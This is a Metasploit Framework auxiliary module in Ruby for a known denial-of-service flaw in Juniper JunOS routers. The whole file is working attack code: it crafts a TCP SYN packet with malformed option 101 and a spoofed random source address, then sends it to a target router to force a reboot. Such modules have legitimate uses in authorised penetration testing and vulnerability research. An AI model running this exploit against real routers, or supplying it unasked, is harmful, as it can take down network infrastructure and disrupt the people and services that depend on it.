##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Dos

	# The whole point is to cause a router crash.
	Rank = ManualRanking

	def initialize
		super(
			'Name'        => 'Juniper JunOS Malformed TCP Option',
			'Description' => %q{ This module exploits a denial of service vulnerability
				in Juniper Network's JunOS router operating system. By sending a TCP
				packet with TCP option 101 set, an attacker can cause an affected
				router to reboot.
				},
			'Author'      => 'todb',
			'License'     => MSF_LICENSE,
			'References' =>
				[
					['BID', '37670'],
					['OSVDB', '61538'],
					['URL','http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/']
				]
		)

		register_options([
			OptInt.new('RPORT', [false, 'The destination port (defaults to random)']),
			OptInt.new('SPORT', [false, 'Source port (defaults to random)']),
			OptAddress.new('SHOST', [false, 'Source address (defaults to random)'])
		])

		deregister_options('FILTER','PCAPFILE', 'SNAPLEN')
	end

	def rport
		datastore['RPORT'].to_i.zero? ? rand(0xffff) : datastore['RPORT'].to_i
	end

	def sport
		datastore['SPORT'].to_i.zero? ? rand(0xffff) : datastore['SPORT'].to_i
	end

	def shost
		datastore['SHOST'] || IPAddr.new(rand(0xffffffff), Socket::AF_INET).to_s
	end

	def run

		open_pcap

		p = PacketFu::TCPPacket.new
		p.ip_daddr = rhost
		p.ip_saddr = shost
		p.ip_ttl = rand(128) + 128
		p.tcp_sport = sport
		p.tcp_dport = rport
		p.tcp_flags.syn = 1
		p.tcp_win = rand(4096)+1
		p.tcp_opts = "e\x02\x01\x00" # Opt 101, len 2, nop, eol
		p.recalc
		print_status("#{p.ip_daddr}:#{p.tcp_dport} Sending TCP Syn packet from #{p.ip_saddr}:#{p.tcp_sport}")
		capture_sendto(p,rhost)
		close_pcap
	end
end
